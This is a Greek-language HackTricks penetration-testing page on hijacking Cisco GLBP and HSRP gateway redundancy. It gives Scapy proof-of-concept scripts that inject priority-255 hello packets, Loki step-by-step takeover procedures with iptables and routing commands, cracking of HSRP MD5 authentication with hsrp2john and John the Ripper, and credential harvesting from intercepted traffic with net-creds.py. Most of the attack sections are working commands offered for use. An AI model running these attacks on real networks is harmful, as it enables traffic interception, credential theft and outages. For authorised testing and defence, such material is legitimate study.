# GLBP & HSRP Επιθέσεις

{{#include ../../banners/hacktricks-training.md}}


## Επισκόπηση Hijacking του FHRP

### Επισκόπηση του FHRP

Το FHRP έχει σχεδιαστεί για να παρέχει ανθεκτικότητα στο δίκτυο συγχωνεύοντας πολλαπλούς δρομολογητές σε μία ενιαία εικονική μονάδα, βελτιώνοντας έτσι την κατανομή φορτίου και την ανοχή σε σφάλματα. Η Cisco Systems εισήγαγε σημαντικά πρωτόκολλα αυτής της οικογένειας, όπως τα GLBP και HSRP.

### GLBP — Πληροφορίες Πρωτοκόλλου

Το GLBP της Cisco λειτουργεί στο TCP/IP stack και χρησιμοποιεί UDP στην πόρτα 3222 για επικοινωνία. Οι δρομολογητές σε μία ομάδα GLBP ανταλλάσσουν πακέτα "hello" κάθε 3 δευτερόλεπτα. Αν ένας δρομολογητής σταματήσει να στέλνει αυτά τα πακέτα για 10 δευτερόλεπτα, θεωρείται ότι είναι εκτός λειτουργίας. Ωστόσο, αυτοί οι χρονισμοί δεν είναι σταθεροί και μπορούν να τροποποιηθούν.

Το GLBP για IPv6 χρησιμοποιεί multicast **FF02::66** πάνω από UDP/3222, και η μορφή της εικονικής MAC γίνεται `0007.b4xx.xxyy` (το AVF ID βρίσκεται στο τελευταίο byte). Οι χρονισμοί και η επιφάνεια επίθεσης παραμένουν ίδια με το IPv4, οπότε οι τεχνικές hijack λειτουργούν και σε dual‑stack δίκτυα.

### Λειτουργία GLBP και Κατανομή Φορτίου

Το GLBP ξεχωρίζει γιατί επιτρέπει κατανομή φορτίου ανάμεσα σε δρομολογητές χρησιμοποιώντας μία μόνο εικονική IP σε συνδυασμό με πολλαπλές εικονικές MAC διευθύνσεις. Σε μια ομάδα GLBP, κάθε δρομολογητής συμμετέχει σε forwarding. Σε αντίθεση με HSRP/VRRP, το GLBP προσφέρει πραγματικό load balancing μέσω διαφορετικών μηχανισμών:

- **Host-Dependent Load Balancing:** Διατηρεί σταθερή ανάθεση AVF MAC σε έναν host, απαραίτητο για σταθερές NAT ρυθμίσεις.
- **Round-Robin Load Balancing:** Η προεπιλεγμένη μέθοδος, που εναλλάσσει την ανάθεση AVF MAC μεταξύ των αιτούντων hosts.
- **Weighted Round-Robin Load Balancing:** Κατανέμει το φορτίο με βάση προκαθορισμένα metrics "Weight".

### Κύρια Συστατικά και Ορολογία στο GLBP

- **AVG (Active Virtual Gateway):** Ο κύριος δρομολογητής, υπεύθυνος για την κατανομή MAC διευθύνσεων στους ομότιμους δρομολογητές.
- **AVF (Active Virtual Forwarder):** Ένας δρομολογητής ορισμένος να διαχειρίζεται την προώθηση της κίνησης.
- **GLBP Priority:** Ένα metric που καθορίζει το AVG, ξεκινάει από προεπιλογή 100 και κυμαίνεται από 1 έως 255.
- **GLBP Weight:** Αντανακλά το τρέχον φορτίο σε έναν δρομολογητή, ρυθμιζόμενο χειροκίνητα ή μέσω Object Tracking.
- **GLBP Virtual IP Address:** Λειτουργεί ως το default gateway του δικτύου για όλες τις συνδεδεμένες συσκευές.

Για την αλληλεπίδραση, το GLBP χρησιμοποιεί τη reserved multicast διεύθυνση 224.0.0.102 και την πόρτα UDP 3222. Οι δρομολογητές στέλνουν πακέτα "hello" κάθε 3 δευτερόλεπτα και θεωρούνται μη λειτουργικοί αν χαθεί κάποιο πακέτο για διάρκεια 10 δευτερολέπτων.

### Μηχανισμός Επίθεσης GLBP

Ένας attacker μπορεί να γίνει ο primary δρομολογητής στέλνοντας ένα GLBP πακέτο με την υψηλότερη τιμή priority (255). Αυτό μπορεί να οδηγήσει σε DoS ή MITM επιθέσεις, επιτρέποντας υποκλοπή ή ανακατεύθυνση της κίνησης.

**Πρακτικό GLBP hijack με Scapy (σύντομο PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Κατασκευάστε τα bytes του payload για να μιμηθείτε την κεφαλίδα GLBP (version/opcode/priority/weight/VRID). Η επαναλαμβανόμενη αποστολή του frame διασφαλίζει ότι κερδίζετε την AVG election εάν η authentication απουσιάζει.

### Εκτέλεση GLBP Attack με Loki

[Loki](https://github.com/raizo62/loki_on_kali) μπορεί να πραγματοποιήσει ένα GLBP attack εγχύοντας ένα packet με priority και weight ρυθμισμένα σε 255. Τα προεπιθετικά βήματα περιλαμβάνουν τη συλλογή πληροφοριών όπως το virtual IP address, η παρουσία authentication και οι τιμές priority των routers χρησιμοποιώντας εργαλεία όπως το Wireshark.

Attack Steps:

1. Μεταβείτε σε promiscuous mode και ενεργοποιήστε το IP forwarding.
2. Εντοπίστε τον στοχευόμενο router και ανακτήστε την IP του.
3. Δημιουργήστε ένα Gratuitous ARP.
4. Εγχύστε ένα κακόβουλο GLBP packet, μιμούμενος τον AVG.
5. Αναθέστε μια secondary IP address στην network interface του attacker, αντικατοπτρίζοντας την GLBP virtual IP.
6. Εφαρμόστε SNAT για πλήρη ορατότητα της κίνησης.
7. Προσαρμόστε το routing για να εξασφαλίσετε συνεχή internet πρόσβαση μέσω του αρχικού AVG router.

Ακολουθώντας αυτά τα βήματα, ο attacker τοποθετείται ως "man in the middle", ικανός να παρεμβαίνει και να αναλύει network traffic, συμπεριλαμβανομένων των unencrypted ή ευαίσθητων δεδομένων.

Για επίδειξη, εδώ είναι τα απαιτούμενα command snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Η παρακολούθηση και παρεμβολή της κυκλοφορίας μπορεί να γίνει χρησιμοποιώντας net-creds.py ή παρόμοια εργαλεία για την καταγραφή και ανάλυση των δεδομένων που ρέουν στο παραβιασμένο δίκτυο.

### Παθητική εξήγηση της κατάληψης HSRP με λεπτομέρειες εντολών

#### Επισκόπηση του HSRP (Hot Standby Router/Redundancy Protocol)

Το HSRP είναι ένα ιδιόκτητο πρωτόκολλο της Cisco σχεδιασμένο για εφεδρεία πύλης δικτύου. Επιτρέπει τη διαμόρφωση πολλαπλών φυσικών δρομολογητών σε μία ενιαία λογική οντότητα με κοινή IP διεύθυνση. Αυτή η λογική οντότητα διαχειρίζεται από έναν κύριο δρομολογητή που είναι υπεύθυνος για την προώθηση της κυκλοφορίας. Σε αντίθεση με το GLBP, που χρησιμοποιεί μετρικές όπως προτεραιότητα και βάρος για την εξισορρόπηση φόρτου, το HSRP βασίζεται σε έναν μόνο ενεργό δρομολογητή για τη διαχείριση της κυκλοφορίας.

Το HSRPv1 χρησιμοποιεί multicast **224.0.0.2** και εικονικό MAC `0000.0c07.acXX`; το HSRPv2 και το HSRPv2 για IPv6 χρησιμοποιούν **224.0.0.102 / FF02::66** και εικονικό MAC `0000.0c9f.fXXX`. Η θύρα προορισμού UDP είναι **1985** για IPv4 και **2029** για IPv6.

#### Ρόλοι και ορολογία στο HSRP

- **HSRP Active Router**: Η συσκευή που λειτουργεί ως πύλη, διαχειρίζεται τη ροή της κυκλοφορίας.
- **HSRP Standby Router**: Ένας εφεδρικός δρομολογητής, έτοιμος να αναλάβει αν ο ενεργός δρομολογητής αποτύχει.
- **HSRP Group**: Ένα σύνολο δρομολογητών που συνεργάζονται για να σχηματίσουν έναν ενιαίο ανθεκτικό εικονικό δρομολογητή.
- **HSRP MAC Address**: Μία εικονική διεύθυνση MAC που εκχωρείται στον λογικό δρομολογητή του HSRP.
- **HSRP Virtual IP Address**: Η εικονική IP διεύθυνση της ομάδας HSRP, που λειτουργεί ως προεπιλεγμένη πύλη για τις συνδεδεμένες συσκευές.

#### Εκδόσεις HSRP

Το HSRP υπάρχει σε δύο εκδόσεις, HSRPv1 και HSRPv2, που διαφέρουν κυρίως στην χωρητικότητα ομάδων, στη χρήση multicast IP και στη δομή της εικονικής διεύθυνσης MAC. Το πρωτόκολλο χρησιμοποιεί συγκεκριμένες multicast IP διευθύνσεις για την ανταλλαγή πληροφοριών υπηρεσίας, με πακέτα Hello που αποστέλλονται κάθε 3 δευτερόλεπτα. Ένας δρομολογητής θεωρείται ανενεργός αν δεν ληφθεί κανένα πακέτο εντός διαστήματος 10 δευτερολέπτων.

#### Μηχανισμός επίθεσης HSRP

Οι επιθέσεις HSRP περιλαμβάνουν την εξαναγκαστική ανάληψη του ρόλου του Active Router με την έγχυση μιας μέγιστης τιμής προτεραιότητας. Αυτό μπορεί να οδηγήσει σε Man-In-The-Middle (MITM). Απαραίτητα βήματα πριν την επίθεση περιλαμβάνουν τη συλλογή πληροφοριών για τη διαμόρφωση HSRP, κάτι που μπορεί να γίνει χρησιμοποιώντας Wireshark για ανάλυση της κυκλοφορίας.

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Αν η αυθεντικοποίηση **δεν** είναι ρυθμισμένη, η συνεχής αποστολή hellos με υψηλότερη προτεραιότητα αναγκάζει τους peers σε *Speak*/*Listen* καταστάσεις και σας επιτρέπει να γίνετε *Active*, ανακατευθύνοντας την κίνηση μέσω του host σας.

**Ειδικές περιπτώσεις αυθεντικοποίησης HSRP**

- Η legacy plain-text auth μπορεί εύκολα να πλαστογραφηθεί.
- Η MD5 authentication καλύπτει μόνο το HSRP payload· εσκεμμένα πακέτα μπορούν ακόμη να προκαλέσουν rate-limit/DoS στα control planes. Εκδόσεις NX-OS προηγουμένως επέτρεψαν DoS ενάντια σε authenticated groups (βλ. Cisco advisory CSCup11309).
- Σε πολλά ISP / VPS shared VLANs, τα HSRPv1 multicasts είναι ορατά στους tenants· χωρίς αυθεντικοποίηση μπορείτε να συμμετάσχετε και να preempt-άρετε την κίνηση.

#### Βήματα για την Παράκαμψη της Αυθεντικοποίησης HSRP

1. Αποθηκεύστε την δικτυακή κίνηση που περιέχει δεδομένα HSRP ως αρχείο .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Εξάγετε τα MD5 hashes από το .pcap αρχείο χρησιμοποιώντας hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Σπάστε τα MD5 hashes χρησιμοποιώντας John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Εκτέλεση HSRP Injection με Loki**

1. Εκκινήστε το Loki για να εντοπίσετε HSRP advertisements.
2. Θέστε τη δικτυακή διεπαφή σε promiscuous mode και ενεργοποιήστε το IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Χρησιμοποιήστε το Loki για να στοχεύσετε τον συγκεκριμένο router, εισάγετε τον σπασμένο HSRP password, και κάντε τις απαραίτητες ρυθμίσεις για να μιμηθείτε τον Active Router.
4. Αφού αποκτήσετε τον ρόλο του Active Router, διαμορφώστε τη δικτυακή διεπαφή και τα iptables για να υποκλέψετε την νόμιμη κίνηση.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Τροποποιήστε τον πίνακα δρομολόγησης ώστε να δρομολογείται η κίνηση μέσω του πρώην Active Router.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Χρησιμοποιήστε το net-creds.py ή ένα παρόμοιο εργαλείο για να καταγράψετε credentials από την υποκλεψμένη κίνηση.
```shell
sudo python2 net-creds.py -i eth0
```

Η εκτέλεση αυτών των βημάτων θέτει τον επιτιθέμενο σε θέση να υποκλέψει και να χειριστεί την κίνηση, παρόμοια με τη διαδικασία για GLBP hijacking. Αυτό αναδεικνύει την ευπάθεια σε πρωτόκολλα redundancy όπως το HSRP και την ανάγκη για ισχυρά μέτρα ασφάλειας.

## Αναφορές

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
